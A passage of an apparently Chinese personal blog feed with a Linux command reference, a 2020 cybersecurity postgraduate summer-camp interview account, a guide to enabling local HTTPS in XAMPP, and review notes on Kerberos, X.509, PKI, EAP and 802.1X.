&#x3D; gigas<br>T &#x3D; teras<br>-o 　不显示缓冲区调节列。<br>-s&lt;间隔秒数&gt; 　持续观察内存使用状况。<br>-t 　显示内存总和列。<br>-V 　显示版本信息。</p><h3 id="系统设置"><a href="#系统设置" class="headerlink" title="系统设置"></a>系统设置</h3><h4 id="dircolors"><a href="#dircolors" class="headerlink" title="dircolors"></a>dircolors</h4><p>dircolors命令用于设置 ls 指令在显示目录或文件时所用的色彩</p><h4 id="crontab"><a href="#crontab" class="headerlink" title="crontab"></a>crontab</h4><p>crontab是用来定期执行程序的命令。<br>当安装完成操作系统之后，默认便会启动此任务调度命令。<br>crond 命令每分锺会定期检查是否有要执行的工作，如果有要执行的工作便会自动执行该工作。</p><p>语法：</p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crmsh">crontab [ -u <span class="hljs-keyword">user</span> <span class="hljs-title">] &#123; -l</span> | -r | -e &#125;<br></code></pre></td></tr></table></figure><p>参数：</p><p>-e : 执行文字编辑器来设定时程表，内定的文字编辑器是 VI，如果你想用别的文字编辑器，则请先设定 VISUAL 环境变数来指定使用那个文字编辑器(比如说 setenv VISUAL joe)<br>-r : 删除目前的时程表<br>-l : 列出目前的时程表</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">f1 f2 f3 f4 f5 program<br><span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span>    <span class="hljs-symbol">*</span><br>-    -    -    -    -<br>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<br>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +----- 星期中星期几 (0 - 7) (星期天 为0)</span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +---------- 月份 (1 - 12) </span><br><span class="hljs-string"></span>|<span class="hljs-string">    </span>|<span class="hljs-string">    +--------------- 一个月中的第几天 (1 - 31)</span><br><span class="hljs-string"></span>|<span class="hljs-string">    +-------------------- 小时 (0 - 23)</span><br><span class="hljs-string">+------------------------- 分钟 (0 - 59)</span><br></code></pre></td></tr></table></figure><h4 id="enable"><a href="#enable" class="headerlink" title="enable"></a>enable</h4><p>enable命令用于启动或关闭 shell 内建指令。<br>若要执行的文件名称与shell内建指令相同，可用enable -n来关闭shell内建指令。若不加-n参数，enable可重新启动关闭的指令。</p><h4 id="export"><a href="#export" class="headerlink" title="export"></a>export</h4><p>export 命令用于设置或显示环境变量。<br>在 shell 中执行程序时，shell 会提供一组环境变量。export 可新增，修改或删除环境变量，供后续执行的程序使用。export 的效力仅限于该次登陆操作。</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">export <span class="hljs-comment">[-fnp]</span><span class="hljs-comment">[变量名称]</span>=<span class="hljs-comment">[变量设置值]</span><br></code></pre></td></tr></table></figure><p>参数说明：</p><p>-f 　代表[变量名称]中为函数名称。<br>-n 　删除指定的变量。变量实际上并未删除，只是不会输出到后续指令的执行环境中。<br>-p 　列出所有的shell赋予程序的环境变量。</p><h4 id="insmod"><a href="#insmod" class="headerlink" title="insmod"></a>insmod</h4><p>insmod（英文全拼：install module）命令用于载入模块。<br>Linux有许多功能是通过模块的方式，在需要时才载入kernel。如此可使kernel较为精简，进而提高效率，以及保有较大的弹性。这类可载入的模块，通常是设备驱动程序。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">insmod <span class="hljs-selector-attr">[-fkmpsvxX]</span><span class="hljs-selector-attr">[-o &lt;模块名称&gt;]</span><span class="hljs-selector-attr">[模块文件]</span><span class="hljs-selector-attr">[符号名称 = 符号值]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-f 　不检查目前kernel版本与模块编译时的kernel版本是否一致，强制将模块载入。<br>-k 　将模块设置为自动卸除。<br>-m 　输出模块的载入信息。<br>-o&lt;模块名称&gt; 　指定模块的名称，可使用模块文件的文件名。<br>-p 　测试模块是否能正确地载入kernel。<br>-s 　将所有信息记录在系统记录文件中。<br>-v 　执行时显示详细的信息。<br>-x 　不要汇出模块的外部符号。<br>-X 　汇出模块所有的外部符号，此为预设置。</p><h4 id="lsmod"><a href="#lsmod" class="headerlink" title="lsmod"></a>lsmod</h4><p>lsmod（英文全拼：list modules）命令用于显示已载入系统的模块。<br>执行 lsmod 指令，会列出所有已载入系统的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放入核心。您可以将这些功能编译成一个个单独的模块，待需要时再分别载入。</p><h4 id="rmmod"><a href="#rmmod" class="headerlink" title="rmmod"></a>rmmod</h4><p>rmmod（英文全拼：remove module）命令用于删除模块。<br>执行 rmmod 指令，可删除不需要的模块。Linux 操作系统的核心具有模块化的特性，应此在编译核心时，务须把全部的功能都放如核心。你可以将这些功能编译成一个个单独的模块，待有需要时再分别载入它们。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">rmmod <span class="hljs-selector-attr">[-as]</span><span class="hljs-selector-attr">[模块名称...]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-a 　删除所有目前不需要的模块。<br>-s 　把信息输出至syslog常驻服务，而非终端机界面。</p><h4 id="passwd"><a href="#passwd" class="headerlink" title="passwd"></a>passwd</h4><p>passwd命令用来更改使用者的密码</p><p>语法：</p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">passwd <span class="hljs-comment">[-k]</span> <span class="hljs-comment">[-l]</span> <span class="hljs-comment">[-u <span class="hljs-comment">[-f]</span>]</span> <span class="hljs-comment">[-d]</span> <span class="hljs-comment">[-S]</span> <span class="hljs-comment">[username]</span><br></code></pre></td></tr></table></figure><p>参数：</p><p>-d 删除密码<br>-f 强迫用户下次登录时必须修改口令<br>-w 口令要到期提前警告的天数<br>-k 更新只能发送在过期之后<br>-l 停止账号使用<br>-S 显示密码信息<br>-u 启用已被停止的账户<br>-x 指定口令最长存活期<br>-g 修改群组密码<br>指定口令最短存活期<br>-i 口令过期后多少天停用账户</p>]]></content>
    
    
    
    <tags>
      
      <tag>Linux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2020网安夏令营保研经验总结</title>
    <link href="/blog/2020/07/27/2020%E7%BD%91%E5%AE%89%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/"/>
    <url>/blog/2020/07/27/2020%E7%BD%91%E5%AE%89%E5%A4%8F%E4%BB%A4%E8%90%A5%E4%BF%9D%E7%A0%94%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/</url>
    
    <content type="html"><![CDATA[<p><strong>2020年夏令营工作告一段落，写篇博客总结一下今年参加夏令营的吧，以供学弟学妹们参考。</strong></p><p><img src="/images/fj52.jpg"></p><span id="more"></span><h2 id="0x00准备"><a href="#0x00准备" class="headerlink" title="0x00准备"></a>0x00准备</h2><p>大概从四月份开始，开始复习专业课，主要复习了计网、操作系统、密码学、计算机与网络安全、软件安全。今年因为疫情原因，课程基本都在家上的，空闲的时间也挺多的。</p><p>到了五月份开始，开始各个高校夏令营报名工作，今年由于疫情原因，面试多为线上，因此大佬门都海投，于是我也进行了多个学校的投递，情况如下：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">夏令营投递：<br><span class="hljs-bullet">- </span>复旦大学网安<br><span class="hljs-bullet">- </span>南京大学计算机<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>中科院信工所<br><span class="hljs-bullet">- </span>中科院计算所<br><span class="hljs-bullet">- </span>武汉大学网安<br><span class="hljs-bullet">- </span>东南大学网安<br><span class="hljs-bullet">- </span>华科网安<br>夏令营入营：<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>中科院信工所<br><span class="hljs-bullet">- </span>中科院计算所<br><span class="hljs-bullet">- </span>武汉大学网安<br><span class="hljs-bullet">- </span>东南大学网安<br><span class="hljs-bullet">- </span>华科网安<br>夏令营参加：<br><span class="hljs-bullet">- </span>上海交大网安<br><span class="hljs-bullet">- </span>中科大网安<br><span class="hljs-bullet">- </span>武汉大学网安<br></code></pre></td></tr></table></figure><h2 id="0x01联系导师"><a href="#0x01联系导师" class="headerlink" title="0x01联系导师"></a>0x01联系导师</h2><p>6月初的时候想着大家都去联系导师了，我就去联系了一个试试。给上海交大的一个老师发了封邮件，老师回复了，并且成功要到了微信，这个老师还是我电的校友，有点巧合，大家联系导师的时候也可以注意一下这方面，校友最起码印象分就挺好。老师问我要不要跟着他手下的一个项目，这时候肯定不会拒绝的，就跟着组内老师一起做了，由于大学期间也做过好多项目了，这点问题不在话下，可以接手顺利操作。夏令营前基本就联系这一个导师，怕联系多了以后太尴尬，不喜欢放老师鸽子。夏令营前联系导师面试的时候有意想不到的收获哦，老师说不定可以抬你一手（前提是你能力不差，他觉得你可以达到他收的学生标准吧）。</p><p>随后夏令营期间有联系了一个科大老师，因为科大的必须找到老师接收才可以，因此就联系了一个导师，导师也同意接收我了，目前上交结果没出，所以还是做了件不好的事，如果上交过了可能就不会去科大了。</p><h2 id="0x02面试"><a href="#0x02面试" class="headerlink" title="0x02面试"></a>0x02面试</h2><p>今年由于疫情影响，面试基本都是采用网络面试的形式，双机位。</p><h3 id="武大"><a href="#武大" class="headerlink" title="武大"></a>武大</h3><p>武汉大学网安营员大概二百人，面试采用分组网络面试，和上交巧了都是同一天，找老师调了一下顺序。面试内容就是英文面试+专业面试。英语问了两个问题，介绍大学做的项目和为什么选择武大，问题很简单。接下来老师基本都是看我的项目经历问我项目细节，基本都能回答出来，最后老师提了句以后做东西要遵照国际标准，整体面试感觉挺好。最后录取百分之七十给优营，我大概在三十名的样子，拿到了优营。</p><h3 id="上海交大"><a href="#上海交大" class="headerlink" title="上海交大"></a>上海交大</h3><p>上海交大面试在下午，随机抽取幸运观众面试，没有顺序。面试用的中文自我介绍，然后老师问项目细节，问的很详细，考验科研能力，也有好多问题回答不上来。然后老师抽了三个专业课题目提问，通过面试后和同学交流，问题主要包括概率论、线性代数、计算机与网络安全（主要）、密码学等。然后用英文问了我一个简单问题，但是我一时想不出来怎么回答，说了几句后给老师说不是很擅长口语，老师们笑了，说就知道你们会准备英文自我介绍，所以我们就取消了英文自我介绍，最后表达了一下很想来交大，面试就结束了。整体面试感觉不是很好，英文没说好且中途还被怼了，等结果吧，说不定还有老师抬一手呢。据我了解其他人面试貌似也不怎么顺利，因此还是有希望的。</p><h3 id="中科大"><a href="#中科大" class="headerlink" title="中科大"></a>中科大</h3><p>中科大的老师问的问题都很基础，注重基础，不过我遇到的那组老师都特别爱怼人，直到把你问到不会为止，主要问了学过的课程，数据结构，操作系统，线性代数，密码学等等。英语问了一个简单的问题，介绍一下自己的家乡。没怎么问项目的事情，可能科大老师觉得基础比较重要吧。</p><h2 id="0x03去向"><a href="#0x03去向" class="headerlink" title="0x03去向"></a>0x03去向</h2><p>最终上交那边没过，今年上交太难了，缩招加本校保护，我们学院夏令营入营好多就进了两个。最终去向是选择了中国科学技术大学。有一说一，中科大夏令营是所有参加的夏令营中体验最好的。</p><p>————————————————————分割线———————————————————–</p><p>10.11号收到了上海交大的补录通知，最终去了上交，非常不好意思的咕咕咕了科大的老师，但是老师也没有责怪我。由于个人以后不打算做科研，因此选择了机会众多的上海交大，如果想去做科研，科大可能也是个很好的选择，科大的理科很强，学术氛围浓厚。</p>]]></content>
    
    
    
    <tags>
      
      <tag>保研</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XAMPP本地localhost配置HTTPS调试</title>
    <link href="/blog/2020/06/28/XAMPP%E6%9C%AC%E5%9C%B0localhost%E9%85%8D%E7%BD%AEHTTPS%E8%B0%83%E8%AF%95/"/>
    <url>/blog/2020/06/28/XAMPP%E6%9C%AC%E5%9C%B0localhost%E9%85%8D%E7%BD%AEHTTPS%E8%B0%83%E8%AF%95/</url>
    
    <content type="html"><![CDATA[<p><strong>最近在给CKeditor写一个获取location插件的时候，API要求必须使用https连接，于是学习了一下配置本地https调试的流程，记录一下过程</strong></p><p><img src="/images/fj51.jpg"></p><span id="more"></span><h2 id="用openssl生成key和crt文件"><a href="#用openssl生成key和crt文件" class="headerlink" title="用openssl生成key和crt文件"></a>用openssl生成key和crt文件</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">xin@ubuntu:/opt/lampp/etc/ssl.crt$ sudo openssl req -x509 -nodes -days 36500 -newkey rsa:2048 -keyout ./server.key -out ./server.crt<br>Can<span class="hljs-string">&#x27;t load /home/xin/.rnd into RNG</span><br><span class="hljs-string">139698234061248:error:2406F079:random number generator:RAND_load_file:Cannot open file:../crypto/rand/randfile.c:88:Filename=/home/xin/.rnd</span><br><span class="hljs-string">Generating a RSA private key</span><br><span class="hljs-string">........+++++</span><br><span class="hljs-string">.....................+++++</span><br><span class="hljs-string">writing new private key to &#x27;</span>./server.key<span class="hljs-string">&#x27;</span><br><span class="hljs-string">-----</span><br><span class="hljs-string">You are about to be asked to enter information that will be incorporated</span><br><span class="hljs-string">into your certificate request.</span><br><span class="hljs-string">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="hljs-string">There are quite a few fields but you can leave some blank</span><br><span class="hljs-string">For some fields there will be a default value,</span><br><span class="hljs-string">If you enter &#x27;</span>.<span class="hljs-string">&#x27;, the field will be left blank.</span><br><span class="hljs-string">-----</span><br><span class="hljs-string">Country Name (2 letter code) [AU]:CN</span><br><span class="hljs-string">State or Province Name (full name) [Some-State]:Shandong</span><br><span class="hljs-string">Locality Name (eg, city) []:Zaozhuang</span><br><span class="hljs-string">Organization Name (eg, company) [Internet Widgits Pty Ltd]:</span><br><span class="hljs-string">Organizational Unit Name (eg, section) []:</span><br><span class="hljs-string">Common Name (e.g. server FQDN or YOUR name) []:localhost</span><br><span class="hljs-string">Email Address []:1583810565@qq.com</span><br><span class="hljs-string"></span><br><span class="hljs-string">xin@ubuntu:/opt/lampp/etc/ssl.crt$ sudo mv server.key /opt/lampp/etc/ssl.key</span><br></code></pre></td></tr></table></figure><h2 id="配置apache"><a href="#配置apache" class="headerlink" title="配置apache"></a>配置apache</h2><p>打开&#x2F;opt&#x2F;lampp&#x2F;etc&#x2F;extra&#x2F;目录，里面有个httpd-ssl.conf文件，修改以下内容：</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">SSLCertificateFile</span> <span class="hljs-string">&quot;/opt/lampp/etc/ssl.crt/server.crt&quot;</span><br>SSLCertificateKeyFile <span class="hljs-string">&quot;/opt/lampp/etc/ssl.key/server.key&quot;</span><br></code></pre></td></tr></table></figure><p>保存后退出（记得用管理员权限）</p><p>httpd.conf也确认一下是否开启了SSL：</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># Secure (SSL/TLS) connections</span><br><span class="hljs-section">&lt;IfModule ssl_module&gt;</span><br><span class="hljs-comment"># XAMPP</span><br><span class="hljs-section">&lt;IfDefine SSL&gt;</span><br><span class="hljs-attribute">Include</span> etc/extra/httpd-ssl.conf<br><span class="hljs-section">&lt;/IfDefine&gt;</span><br><span class="hljs-section">&lt;/IfModule&gt;</span><br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>WEB</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>保研夏令营复习计划-计算机与网络安全</title>
    <link href="/blog/2020/05/17/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
    <url>/blog/2020/05/17/%E4%BF%9D%E7%A0%94%E5%A4%8F%E4%BB%A4%E8%90%A5%E5%A4%8D%E4%B9%A0%E8%AE%A1%E5%88%92-%E8%AE%A1%E7%AE%97%E6%9C%BA%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<p><strong>计算机与网络安全是我们网络空间安全专业最重要的一门专业课之一主要包括网络安全应用、系统安全。</strong></p><p><img src="/images/fj50.jpg"></p><span id="more"></span><h1 id="网络安全应用"><a href="#网络安全应用" class="headerlink" title="网络安全应用"></a>网络安全应用</h1><h2 id="密钥分配和用户认证"><a href="#密钥分配和用户认证" class="headerlink" title="密钥分配和用户认证"></a>密钥分配和用户认证</h2><h3 id="基于对称加密的密钥分配"><a href="#基于对称加密的密钥分配" class="headerlink" title="基于对称加密的密钥分配"></a>基于对称加密的密钥分配</h3><p>AB双方间的密钥分发有下列选择：</p><ul><li>A能够选定密钥并通过物理方法传递给B</li><li>第三方可以选定密钥并通过物理方法传递给A和B</li><li>如果A和B不久前使用过一个密钥，一方能够把使用旧密钥加密的新密钥传递给另一方</li><li>如果AB各自有一个到达第三方C的加密链路，C能够在加密链路上传递密钥给A和B</li></ul><p>前两种要求手动传递密钥。对于链路层来说比较合理，因为每个链路层加密设备只和此链路另一端交换数据。但是对于端对端的加密就很不适用。</p><p>第三种选择对链路层加密和端到端加密都是可能的，但是如果攻击者成功地获得一个密钥，那么接下来的所有密钥都暴露了。就算频繁更改链路层加密密钥，这些更改也应该手工完成。为端到端加密提供密钥，第(4) 种选择更可取。</p><p>第四种会用到两种类型的密钥：</p><ul><li>会话密钥：当两个端系统希望通信，它们建立一个逻辑链接。逻辑链接持续过程中所有用户数据都是用一次性的会话密钥加密。</li><li>永久密钥：永久密钥在实体之间用于分发会话密钥。</li></ul><p>第四种需要一个<strong>密钥分发中心KDC</strong></p><p>一般而言，KDC的操作过程如下。<br>(1)当一个主机A期望与另外一个主机建立连接时，它传送一个连接请求包给KDC。主机A和KDC之间的通信使用一个只有此主机 A和KDC共享的主密钥(master key)加密。<br>(2)如果KDC同意建立连接请求，则它产生一个唯一的一 次性会话密钥。它用主机A与之共享的永久密钥加密这个会话密钥，并把加密后的结果发送给主机A。类似地，它用主机B与之共享的永久密钥加密这个会话密钥，并把加密后的结果发送给主机B。<br>(3) A和B现在可以建立一个逻辑连接并交换消息和数据了，其中所有的消息或数据<br>都使用临时性会话密钥加密。</p><h3 id="Kerberos"><a href="#Kerberos" class="headerlink" title="Kerberos"></a>Kerberos</h3><p>Kerberos是一种认证服务，这种认证服务作为Athena计划的一个组成部分由MIT开发。Kerberos要解决的问题是:假设在一个 开放的分布式环境中，工作站的用户希望访问分布在网络各处的服务器上面的服务，希望服务器能够将访问权限限制再授权用户范围内，并且能够认证服务请求。在这个环境中，一个工作站无法准确判断它的终端用户以及请求的服务是否合法，特别是存在以下三种威胁：</p><ul><li>用户可能进入一个特定的工作站，并假装成其他用户操作该工作站。</li><li>用户可能改变一个工作站的网络地址，从该机上发送伪造请求</li><li>用户可能监听信息或者使用重放攻击，从而获得服务或者破坏正常操作</li></ul><h4 id="Kerberos4"><a href="#Kerberos4" class="headerlink" title="Kerberos4"></a>Kerberos4</h4><p>a.用于获取票据授权票据的认证服务交换</p><p><img src="/images/Kerberos4-0.png"></p><p><img src="/images/Kerberos4-01.png"></p><p><img src="/images/Kerberos4-02.png"></p><p>b.用于获得服务授权票据的票据授权服务交换</p><p><img src="/images/Kerberos4-1.png"></p><p><img src="/images/Kerberos4-11.png"></p><p>c.为了获取服务而进行的客户端&#x2F;服务器认证交换</p><p><img src="/images/Kerberos4-2.png"></p><p><img src="/images/Kerberos4-21.png"></p><p><img src="/images/Kerberos4-22.png"></p><p>Kerberos概览：</p><p><img src="/images/Kerberos4-3.png"></p><h4 id="Kerberos5"><a href="#Kerberos5" class="headerlink" title="Kerberos5"></a>Kerberos5</h4><p>版本4和版本5的区别：</p><ol><li>加密系统依赖性：版本四需要使用DES，版本五密文中标记上加密类型标识，可以使用任何类型的加密技术。</li><li>互联网协议的依赖性：版本4需要使用互联网协议IP地址，其他的类型不支持，版本五任何类型的网络地址都可使用。</li><li>消息字节排序：版本四自己选择，版本五采用惯例（抽象表示法1 ASN.1 和基本编码规则 BER）</li><li>票据有效期：版本四最长有效期2^8*5分钟，对于有些应用来说太短了。版本五中有明确的开始和结束时间</li><li>认证转发：版本四不允许将发放给一个客户端的证书转发给其他主机，并由其他客户端使用。版本5允许</li><li>域间认证：版本4中，N个域互相操作需要N^2阶的Kerberos-Kerberos关系。版本5中支持一种需要较少关系的方法</li></ol><h3 id="X-509证书"><a href="#X-509证书" class="headerlink" title="X.509证书"></a>X.509证书</h3><h4 id="证书"><a href="#证书" class="headerlink" title="证书"></a>证书</h4><p>包含以下要素：</p><ul><li>版本</li><li>序列号：此值在发放证书的CA中唯一</li><li>签名算法标识符</li><li>发放者名称</li><li>有效期</li><li>主体名称</li><li>主体公钥信息</li><li>发放者唯一标识符</li><li>扩展</li><li>签名</li></ul><p>每个CA的目录入口都包含如下两种类型的证书：</p><ul><li>前向证书：由其他CA生成的X的证书</li><li>反向证书：由X生成的其他CA的证书</li></ul><p>一个例子：</p><p><img src="/images/x509-0.png"></p><p><strong>证书撤销：</strong></p><p>每个证书都有一个有效期，在典型情况下，一个新的证书恰好在老证书过期前发放。有时候会被提前撤销，比如：</p><ul><li>用户的私钥被认为已经泄露</li><li>用户不再被CA信任</li><li>CA的证书被认为已经泄露</li></ul><h4 id="X-509版本3"><a href="#X-509版本3" class="headerlink" title="X.509版本3"></a>X.509版本3</h4><p>版本3包含了许多可以附加在版本2格式中的可选扩展，每个扩展包括一个扩展标识，一个危险指示符和一个扩展值。危险指示符用来指示一个扩展是否可以被安全的忽略。</p><p>证书扩展可分为下面三个主要类型：</p><ul><li>密钥和策略信息：证书策略是一个命名的规则集合，被用来只是证书对一个特定的具有相同安全需求的团体或者应用类别的适用性</li><li>证书主体和证书发放者属性：可以传递关于证书主体的额外信息</li><li>认证路径约束：这些扩展允许在CA发放给CA的证书中包括约束规定，这些约束可能会限制主体CA可以发放的证书类型。</li></ul><h3 id="公钥基础设施"><a href="#公钥基础设施" class="headerlink" title="公钥基础设施"></a>公钥基础设施</h3><p>PKIX模型中各个主要要素的相互关系：</p><ul><li>端实体</li><li>认证中心CA</li><li>注册中心RA</li><li>CRL发放者：可以代理CA发布CRL</li><li>存储库</li></ul><p><img src="/images/pkix.png"></p><h3 id="问题思考"><a href="#问题思考" class="headerlink" title="问题思考"></a>问题思考</h3><p>1.密钥发送给通信双方的方法？</p><ul><li>A选择一把钥匙并将其交给B</li><li>第三方选择密钥交给AB</li><li>如果AB最近使用过密钥，一方可以将新密钥传输给另一方，使用旧密钥加密</li><li>如果AB都与第三方C有加密连接，C可以将加密链接上的密钥传递给AB</li></ul><p>2.会话密钥与主密钥的区别？</p><p>会话密钥是两个主体之间使用的临时的加密密钥。主密钥是密钥分发中心和主体之间用于编码绘画密钥传输的主体密钥。</p><p>3.什么是密钥分发中心？</p><p>密钥分发中心是向授权主体发送临时会话密钥的系统。使用密钥分发中心与目标主体共享的主密钥，以加密的形式传递每个会话密钥。</p><p>4.一个提供全套Kerberos服务环境由哪些实体组成？</p><p>Kerberos服务器、多个客户端、多个应用服务器</p><p>5.在Kerberos环境下，域指的是什么？</p><p>域是一个环境，其中：1.Kerberos服务器必须具有其数据库中所有参与用户的用户ID和密码。所有用户都在Kerberos服务器上注册。2.Kerberos服务器必须与每个服务器共享一个密钥。所有服务器都在Kerberos服务器上注册</p><h2 id="网络访问控制和云安全"><a href="#网络访问控制和云安全" class="headerlink" title="网络访问控制和云安全"></a>网络访问控制和云安全</h2><h3 id="网络访问控制"><a href="#网络访问控制" class="headerlink" title="网络访问控制"></a>网络访问控制</h3><h4 id="网络访问控制系统组成元素"><a href="#网络访问控制系统组成元素" class="headerlink" title="网络访问控制系统组成元素"></a>网络访问控制系统组成元素</h4><ul><li>访问请求者AR</li><li>策略服务器</li><li>网络访问服务器NAS：远程用户系统想连接公司内网的时候，NAS起到一个访问控制点的作用</li></ul><h4 id="网络访问强制措施"><a href="#网络访问强制措施" class="headerlink" title="网络访问强制措施"></a>网络访问强制措施</h4><p>常用的NAC强制措施：</p><ul><li>IEEE 802.1X ：链路层协议，在一个端口被分配ip之前必须进行强制认证</li><li>虚拟局域网VLAN：在这种方法中，由互联的局域网组成的企业网络被逻辑化分为许多VLAN，NAC系统根据设备是否需要安全修复，是否只是访问互联网，对企业资源何种级别的访问，决定将网络中哪一个虚拟局域网分配给AR。</li><li>防火墙</li><li>动态主机配置协议DHCP管理</li></ul><h3 id="可扩展认证协议"><a href="#可扩展认证协议" class="headerlink" title="可扩展认证协议"></a>可扩展认证协议</h3><p>EAP（Extensible Authentication Protocol）为可扩展身份验证协议，是一系列验证方式的集合，设计理念是满足任何链路层的身份验证需求，支持多种链路层认证方式。EAP协议是IEEE 802.1x认证机制的核心，它将实现细节交由附属的EAP Method协议完成，如何选取EAP method由认证系统特征决定。这样实现了EAP的扩展性及灵活性，EAP可以提供不同的方法分别支持PPP，以太网、无线局域网的链路验证。</p><p><img src="/images/EAP.png"></p><h4 id="认证方法"><a href="#认证方法" class="headerlink" title="认证方法"></a>认证方法</h4><p>EAP支持多种认证方法，这也是EAP被称为可扩展的原因。EAP为客户端系统与认证服务器之间交换信息提供了一种专用传输服务。下面是一些常用的支持EAP的方法：</p><ul><li>EAP-TLS EAP传输层安全</li><li>EAP-TTLS EAP隧道传输层安全</li><li>EAP-GPSK EAP统用预共享密钥</li><li>EAP-IKEv2</li></ul><h3 id="IEEE-802-1X基于端口的网络访问控制"><a href="#IEEE-802-1X基于端口的网络访问控制" class="headerlink" title="IEEE 802.1X基于端口的网络访问控制"></a>IEEE 802.1X基于端口的网络访问控制</h3><p>如图所示，802.1X 使用了受控端口与未受控端口的概念。端口是在认证者之间定义的逻辑实体，可以参照物理网络连接的概念。每一个逻辑端口被映射到两种类型的物理端口中的某-种。未受控端口会忽略请求者的认证状态，允许在请求者以及认证服务器之间交换协议数据单元。受控端口只有在当前请求者被授权允许进行交换时，才可以在请求者与网络上的其他系统间交换协议数据单元。</p><p><img src="/images/ieee802.1x.png"></p><p>在802.1X中主要定义了EAPOL协议(局域网上的可扩展认证协议)。EAPOL协议作用在网络层上，使用了IEEE 802标准的局域网，如数据链路层上的以太网，Wi-Fi等。 为了进行认证，EAPOL允许请求者与认证者之间互相通信，以及两者之间进行EAP包的交换。</p><p><img src="/images/eapol.png"></p><p><img src="/images/eapolflame.png"></p><h3 id="云计算"><a href="#云计算" class="headerlink" title="云计算"></a>云计算</h3><h4 id="云计算组成元素"><a href="#云计算组成元素" class="headerlink" title="云计算组成元素"></a>云计算组成元素</h4><p>云计算：云计算是一种能够通过网络以便利的、按需付费的方式获取计算资源（包括网络、服务器、存储、应用和服务等）并提高其可用性的模式，这些资源来自一个共享的、可配置的资源池，并且能够以最省力和无人干预的方式获取和释放。云模型由5个基本特征、3个服务模型和4个部署模型组成。</p><p><strong>基本特征：</strong></p><ul><li>广泛的网络访问</li><li>快速的可伸缩性</li><li>可度量的服务</li><li>按需自助服务</li><li>资源共享</li></ul><p><strong>三种服务模型：</strong></p><ul><li>软件即服务SaaS</li><li>平台即服务PaaS</li><li>基础设施即服务IaaS</li></ul><p><strong>四种部署模型：</strong></p><p>公有云、私有云、社区云、混合云</p><h2 id="传输层安全"><a href="#传输层安全" class="headerlink" title="传输层安全"></a>传输层安全</h2><h3 id="Web安全需求"><a href="#Web安全需求" class="headerlink" title="Web安全需求"></a>Web安全需求</h3><h4 id="Web安全威胁"><a href="#Web安全威胁" 